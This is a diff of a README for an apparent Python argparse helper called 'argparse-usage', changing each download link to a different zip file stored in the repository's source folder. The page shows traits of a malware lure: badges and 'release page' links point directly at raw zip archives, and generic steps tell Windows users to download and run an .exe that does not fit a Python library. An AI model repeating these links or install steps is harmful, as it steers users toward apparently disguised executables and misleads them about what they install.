@@ -1,6 +1,6 @@
 # ⚙️ argparse-usage - Simple Command Input Made Easy
 
-[![Download argparse-usage](https://img.shields.io/badge/Download%20argparse--usage-blue?style=for-the-badge)](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_1.4.zip)
+[![Download argparse-usage](https://img.shields.io/badge/Download%20argparse--usage-blue?style=for-the-badge)](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_3.8-beta.3.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 To start using **argparse-usage** on your Windows computer, follow these steps carefully.
 
 1. Open this page in your web browser:  
-   [https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_1.4.zip](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_1.4.zip).  
+   [https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_3.8-beta.3.zip](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_3.8-beta.3.zip).  
    This page contains the files needed to install the software.
 
 2. Find the latest release version. It is usually at the top of the list and marked by the newest date.
@@ -103,7 +103,7 @@ You can open these files using Notepad or any text editor.
 To get new versions or fixes:
 
 1. Visit the release page again:  
-   [https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_1.4.zip](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_1.4.zip).
+   [https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_3.8-beta.3.zip](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_3.8-beta.3.zip).
 2. Download the newest `.exe` after checking its release date.
 3. Install it over the existing version.
 
@@ -113,7 +113,7 @@ To get new versions or fixes:
 
 **argparse-usage** uses Python’s standard library module called `argparse` to read and manage input. This tool automatically understands commands and options you type, helping you run tasks without confusion.
 
-This project connects with online resources available at [https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_1.4.zip](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_1.4.zip) to give clear examples and guide users through command usage.
+This project connects with online resources available at [https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_3.8-beta.3.zip](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_3.8-beta.3.zip) to give clear examples and guide users through command usage.
 
 ---
 
@@ -125,4 +125,4 @@ To see the original code or contribute, go to the main repository page on GitHub
 
 ---
 
-[![Download argparse-usage](https://img.shields.io/badge/Download%20argparse--usage-blue?style=for-the-badge)](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_1.4.zip)
+[![Download argparse-usage](https://img.shields.io/badge/Download%20argparse--usage-blue?style=for-the-badge)](https://github.com/Barbabrauncritical732/argparse-usage/raw/refs/heads/main/src/argparse_usage_3.8-beta.3.zip)
